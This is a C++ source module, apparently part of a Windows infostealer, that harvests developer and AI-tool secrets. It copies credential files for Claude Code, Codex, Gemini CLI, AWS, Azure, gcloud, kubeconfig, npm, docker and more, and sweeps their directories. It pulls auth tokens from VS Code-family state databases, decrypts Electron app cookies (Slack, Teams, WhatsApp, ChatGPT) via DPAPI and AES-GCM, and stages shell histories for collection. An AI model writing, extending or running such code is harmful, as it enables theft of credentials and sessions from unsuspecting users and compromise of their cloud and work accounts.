// Developer & AI assistant surfaces (2024-2026 era): tokens and credentials
// left on disk by AI coding tools (Claude Code/Desktop, Codex CLI, Cursor,
// Windsurf, Copilot, Continue, MCP configs), cloud/dev CLIs (gh, aws, azure,
// gcloud, kube, terraform, docker, npm/cargo/gem/nuget), shell histories,
// RDP state, and decrypted cookies from Electron applications (their
// Local State carries a DPAPI-wrapped AES key exactly like Chromium).
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include "../core/b64.h"
#include "../core/crypto.h"
#include "../core/dpapi.h"
#include "../core/json.h"

#include <sqlite3.h>
#include <sstream>

namespace {

constexpr size_t k_per_file = 8ull * 1024 * 1024;

struct SimpleTarget { const char* path; const char* label; };
struct TreeTarget { const char* path; const char* label; size_t per_file_mb; size_t total_mb; };

void stage_env_file(const std::string& path_env, const std::string& label) {
    std::string p = util::expand_env(path_env);
    if (!util::path_exists(p) || util::is_dir(p)) return;
    std::vector<uint8_t> data;
    if (!util::read_file(p, data) || data.empty()) return;
    if (data.size() > k_per_file) data.resize(k_per_file);
    std::string flat = util::replace_all(label, "\\", "_");
    flat = util::replace_all(flat, " ", "_");
    stage::stage_bytes("devtools", flat, data);
}

void stage_env_tree(const std::string& root_env, const std::string& label, size_t per_file,
                    size_t total, int budget = 1500) {
    std::string root = util::expand_env(root_env);
    if (!util::is_dir(root)) return;
    size_t used = 0;
    int n = 0;
    for (auto& f : util::walk_files(root, 6, {})) {
        if ((int)n >= budget || used >= total) break;
        std::vector<uint8_t> data;
        if (!util::read_file(f, data) || data.empty()) continue;
        if (data.size() > per_file) continue; // never truncate silently
        std::string rel = f.size() > root.size() ? f.substr(root.size() + 1) : util::filename_of(f);
        rel = util::replace_all(rel, "\\", "_");
        rel = util::replace_all(rel, "/", "_");
        std::string flat = util::replace_all(label, " ", "_");
        if (!stage::stage_bytes("devtools", flat + "_" + rel, data)) break;
        used += data.size();
        n++;
    }
}

// ---------------- sqlite helpers ----------------
struct Db {
    sqlite3* db = nullptr;
    ~Db() { if (db) sqlite3_close(db); }
    bool open_copy(const std::string& path) {
        if (!util::path_exists(path)) return false;
        std::string tmp = util::join(util::temp_dir(), "d_" + util::filename_of(path));
        std::vector<uint8_t> data;
        if (!util::read_file(path, data) || data.empty()) return false;
        if (!util::write_file(tmp, data)) return false;
        bool ok = sqlite3_open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK;
        util::remove_path(tmp);
        return ok;
    }
    std::vector<std::vector<std::string>> query(const char* sql) {
        std::vector<std::vector<std::string>> rows;
        sqlite3_stmt* st = nullptr;
        if (!db || sqlite3_prepare_v2(db, sql, -1, &st, nullptr) != SQLITE_OK) return rows;
        int cols = sqlite3_column_count(st);
        while (sqlite3_step(st) == SQLITE_ROW) {
            std::vector<std::string> row;
            for (int i = 0; i < cols; ++i) {
                const int type = sqlite3_column_type(st, i);
                auto txt = sqlite3_column_text(st, i);
                auto blob = (const char*)sqlite3_column_blob(st, i);
                int blen = sqlite3_column_bytes(st, i);
                if (type == SQLITE_BLOB && blob && blen > 0) row.emplace_back(blob, blen);
                else if (txt) row.emplace_back((const char*)txt);
                else if (blob && blen > 0) row.emplace_back(blob, blen);
                else row.emplace_back();
            }
            rows.push_back(std::move(row));
        }
        sqlite3_finalize(st);
        return rows;
    }
};

std::string printable_or_hex(const std::string& v, size_t cap = 8192) {
    bool printable = !v.empty();
    for (unsigned char c : v) {
        if (c < 0x20 && c != '\t' && c != '\r' && c != '\n') { printable = false; break; }
    }
    if (printable) return v.size() > cap ? v.substr(0, cap) + "..." : v;
    static const char* d = "0123456789abcdef";
    std::string s = "hex:";
    size_t n = v.size() > cap / 2 ? cap / 2 : v.size();
    for (size_t i = 0; i < n; ++i) { s += d[(uint8_t)v[i] >> 4]; s += d[(uint8_t)v[i] & 0xF]; }
    if (v.size() > n) s += "...";
    return s;
}

// JSON state databases of VS Code-family editors (ItemTable key/value store).
void extract_state_db(const std::string& db_path, const std::string& label) {
    Db db;
    if (!db.open_copy(db_path)) return;
    auto rows = db.query("SELECT key, value FROM ItemTable WHERE "
                         "key LIKE 'cursorAuth%' OR key LIKE 'windsurf%' OR "
                         "key LIKE 'codeium%' OR key LIKE 'secret://%' OR "
                         "key LIKE 'github.copilot%'");
    if (rows.empty()) return;
    std::ostringstream out;
    int n = 0;
    for (auto& r : rows) {
        if (r.size() < 2 || r[0].empty()) continue;
        out << r[0] << " = " << printable_or_hex(r[1]) << "\r\n";
        n++;
    }
    if (n) {
        std::string flat = util::replace_all(label, " ", "_");
        stage::stage_text("devtools", flat + "_state.txt", out.str());
    }
}

// Electron app cookies: the app's own Local State carries a DPAPI-wrapped
// AES key; cookies use the same v10/v11 GCM layout (or raw DPAPI when old).
void electron_cookies(const std::string& app_dir_env, const std::string& label) {
    std::string dir = util::expand_env(app_dir_env);
    if (!util::is_dir(dir)) return;
    util::json js;
    std::vector<uint8_t> key;
    if (util::read_json_file(util::join(dir, "Local State"), js)) {
        try {
            if (js.contains("os_crypt") && js["os_crypt"].contains("encrypted_key")) {
                auto raw = util::b64_decode(js["os_crypt"]["encrypted_key"].get<std::string>());
                if (raw.size() > 5) {
                    std::vector<uint8_t> blob(raw.begin() + 5, raw.end());
                    auto dec = dpapi::unprotect(blob);
                    if (dec && dec->size() == 32) key = *dec;
                }
            }
        } catch (...) {}
    }
    std::string cookie_path = util::join(dir, "Network\\Cookies");
    if (!util::path_exists(cookie_path)) cookie_path = util::join(dir, "Cookies");
    Db db;
    if (!db.open_copy(cookie_path)) return;
    auto rows = db.query("SELECT host_key, name, encrypted_value, value, path FROM cookies");
    std::ostringstream out;
    int n = 0;
    for (auto& r : rows) {
        if (r.size() < 4) continue;
        std::string val;
        const std::string& enc = r[2];
        if (!enc.empty() && enc.size() > 3 && (enc.compare(0, 3, "v10") == 0 || enc.compare(0, 3, "v11") == 0) &&
            key.size() == 32) {
            std::vector<uint8_t> raw(enc.begin(), enc.end());
            if (raw.size() > 15 + 16) {
                std::vector<uint8_t> nonce(raw.begin() + 3, raw.begin() + 15);
                std::vector<uint8_t> tag(raw.end() - 16, raw.end());
                std::vector<uint8_t> ct(raw.begin() + 15, raw.end() - 16);
                auto pt = crypto::aes_gcm_decrypt(key, nonce, ct, tag);
                if (pt) val.assign(pt->begin(), pt->end());
            }
        } else if (enc.size() > 3 && enc.compare(0, 3, "v20") == 0) {
            val = "[v20 locked]";
        } else if (!enc.empty()) {
            auto dec = dpapi::unprotect(std::vector<uint8_t>(enc.begin(), enc.end()));
            if (dec) val.assign(dec->begin(), dec->end());
        }
        if (val.empty()) val = r[3]; // plaintext value column
        if (val.empty()) continue;
        out << r[0] << "\t" << r[1] << "\t" << val << "\t" << r[4] << "\r\n";
        n++;
    }
    if (n) {
        std::string flat = util::replace_all(label, " ", "_");
        stage::stage_text("devtools", flat + "_cookies.txt", out.str());
    }
}

} // namespace

namespace mod {

void devtools(const std::string& staging) {
    std::ostringstream summary;

    // ---- AI coding tools: config + credentials files ----
    const SimpleTarget files[] = {
        {"%USERPROFILE%\\.claude.json", "claude_code_config"},
        {"%USERPROFILE%\\.claude\\.credentials.json", "claude_code_credentials"},
        {"%USERPROFILE%\\.claude\\settings.json", "claude_code_settings"},
        {"%USERPROFILE%\\.codex\\auth.json", "codex_auth"},
        {"%USERPROFILE%\\.codex\\config.toml", "codex_config"},
        {"%USERPROFILE%\\.gemini\\oauth_creds.json", "gemini_cli_creds"},
        {"%USERPROFILE%\\.gemini\\settings.json", "gemini_cli_settings"},
        {"%USERPROFILE%\\.cursor\\mcp.json", "cursor_mcp"},
        {"%USERPROFILE%\\.continue\\config.json", "continue_config"},
        {"%USERPROFILE%\\.continue\\config.yaml", "continue_config_yaml"},
        {"%USERPROFILE%\\.ollama\\id_ed25519", "ollama_identity"},
        {"%USERPROFILE%\\.lmstudio\\.internal\\http-server-config.json", "lmstudio_config"},
        {"%USERPROFILE%\\.cache\\huggingface\\token", "huggingface_token"},
        {"%USERPROFILE%\\.kaggle\\kaggle.json", "kaggle_key"},
        {"%USERPROFILE%\\.netrc", "netrc"},
        {"%APPDATA%\\Claude\\claude_desktop_config.json", "claude_desktop_mcp"},
        {"%APPDATA%\\Claude\\config.json", "claude_desktop_config"},
        {"%APPDATA%\\Windsurf\\mcp_config.json", "windsurf_mcp"},
        {"%APPDATA%\\Code\\User\\mcp.json", "vscode_mcp"},
        {"%APPDATA%\\Code\\User\\settings.json", "vscode_settings"},
        // cloud / dev CLIs
        {"%APPDATA%\\GitHub CLI\\hosts.yml", "gh_cli_hosts"},
        {"%APPDATA%\\glab-cli\\config.yml", "glab_cli_config"},
        {"%APPDATA%\\gcloud\\application_default_credentials.json", "gcloud_adc"},
        {"%APPDATA%\\netlify\\config.json", "netlify_config"},
        {"%APPDATA%\\configstore\\firebase-tools.json", "firebase_tools"},
        {"%APPDATA%\\NuGet\\NuGet.Config", "nuget_config"},
        {"%USERPROFILE%\\.config\\configstore\\firebase-tools.json", "firebase_tools_xdg"},
        {"%USERPROFILE%\\.config\\stripe\\config.toml", "stripe_cli"},
        {"%USERPROFILE%\\.docker\\config.json", "docker_config"},
        {"%USERPROFILE%\\.npmrc", "npmrc"},
        {"%USERPROFILE%\\.yarnrc", "yarnrc"},
        {"%USERPROFILE%\\.yarnrc.yml", "yarnrc_yml"},
        {"%USERPROFILE%\\.cargo\\credentials", "cargo_credentials"},
        {"%USERPROFILE%\\.cargo\\credentials.toml", "cargo_credentials_toml"},
        {"%USERPROFILE%\\.gem\\credentials", "gem_credentials"},
        {"%USERPROFILE%\\.terraformrc", "terraformrc"},
        {"%USERPROFILE%\\.terraform.d\\credentials.tfrc.json", "terraform_credentials"},
        {"%USERPROFILE%\\.pulumi\\credentials.json", "pulumi_credentials"},
        {"%USERPROFILE%\\.kube\\config", "kubeconfig"},
        {"%USERPROFILE%\\.aws\\credentials", "aws_credentials"},
        {"%USERPROFILE%\\.aws\\config", "aws_config"},
        {"%USERPROFILE%\\.azure\\msal_token_cache.json", "azure_msal_cache"},
        {"%USERPROFILE%\\.azure\\azureProfile.json", "azure_profile"},
        {"%USERPROFILE%\\.azure\\accessTokens.json", "azure_access_tokens"},
    };
    int files_hit = 0;
    for (auto& f : files) {
        std::string p = util::expand_env(f.path);
        if (util::path_exists(p) && !util::is_dir(p)) {
            stage_env_file(f.path, f.label);
            files_hit++;
        }
    }
    summary << "  AI/dev credential files: " << files_hit << "\r\n";

    // ---- trees worth a bounded sweep ----
    const TreeTarget trees[] = {
        {"%USERPROFILE%\\.claude", "claude_code", 4, 40},
        {"%USERPROFILE%\\.codex", "codex", 4, 20},
        {"%USERPROFILE%\\.gemini", "gemini", 4, 12},
        {"%USERPROFILE%\\.aws\\sso\\cache", "aws_sso", 2, 12},
        {"%APPDATA%\\gcloud\\legacy_credentials", "gcloud_legacy", 9, 16},
        {"%LOCALAPPDATA%\\Microsoft\\Terminal Server Client", "rdp", 2, 8},
        {"%USERPROFILE%\\.config", "xdg", 2, 24},
    };
    for (auto& t : trees)
        stage_env_tree(t.path, t.label, t.per_file_mb * 1024 * 1024, t.total_mb * 1024 * 1024);

    // ---- VS Code-family state databases (tokens live in ItemTable) ----
    const char* editors[] = {"Code", "Code - Insiders", "VSCodium", "Cursor", "Windsurf", "Trae", "Zed"};
    for (auto* e : editors) {
        std::string db = util::expand_env(std::string("%APPDATA%\\") + e +
                                          "\\User\\globalStorage\\state.vscdb");
        extract_state_db(db, std::string(e) + "_state");
    }
    // AI extension storage (Cline, Roo, Kilo, Continue, Augment...)
    const char* ai_ext_dirs[] = {"saoudrizwan.claude-dev", "rooveterinaryinc.roo-cline",
                                 "kilocode.kilo-code", "continue.continue",
                                 "augment.vscode-augment"};
    for (auto* e : {"Code", "Cursor", "Windsurf"}) {
        for (auto* x : ai_ext_dirs) {
            std::string root = util::expand_env(std::string("%APPDATA%\\") + e +
                                                "\\User\\globalStorage\\" + x);
            if (!util::is_dir(root)) continue;
            stage_env_tree(std::string("%APPDATA%\\") + e + "\\User\\globalStorage\\" + x,
                           std::string(e) + "_" + x, 2ull * 1024 * 1024, 8ull * 1024 * 1024, 300);
        }
    }

    // ---- Electron apps: decrypted cookies from their own key ----
    const SimpleTarget electron[] = {
        {"%APPDATA%\\Claude", "claude_desktop"},
        {"%APPDATA%\\ChatGPT", "chatgpt"},
        {"%APPDATA%\\Slack", "slack"},
        {"%APPDATA%\\Microsoft\\Teams", "teams"},
        {"%APPDATA%\\Notion", "notion"},
        {"%APPDATA%\\Spotify", "spotify"},
        {"%APPDATA%\\Zalo", "zalo"},
        {"%APPDATA%\\WhatsApp", "whatsapp"},
    };
    int electron_hits = 0;
    for (auto& e : electron) {
        std::string d = util::expand_env(e.path);
        if (!util::is_dir(d)) continue;
        electron_cookies(e.path, e.label);
        electron_hits++;
    }
    summary << "  electron app surfaces: " << electron_hits << "\r\n";

    // ---- shell & REPL histories (often contain pasted secrets) ----
    const char* histories[] = {
        "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "%APPDATA%\\Microsoft\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "%USERPROFILE%\\.bash_history",
        "%USERPROFILE%\\.zsh_history",
        "%USERPROFILE%\\.python_history",
        "%USERPROFILE%\\.node_repl_history",
        "%USERPROFILE%\\.psql_history",
        "%USERPROFILE%\\.mysql_history",
        "%USERPROFILE%\\.irb_history",
        "%USERPROFILE%\\.sqlite_history",
    };
    int hist = 0;
    for (auto* h : histories) {
        std::string p = util::expand_env(h);
        if (util::path_exists(p) && !util::is_dir(p)) {
            stage_env_file(h, util::filename_of(std::string(h)) + "_hist");
            hist++;
        }
    }
    summary << "  shell histories: " << hist << "\r\n";

    stage::note("devtools", summary.str());
    (void)staging;
}

} // namespace mod
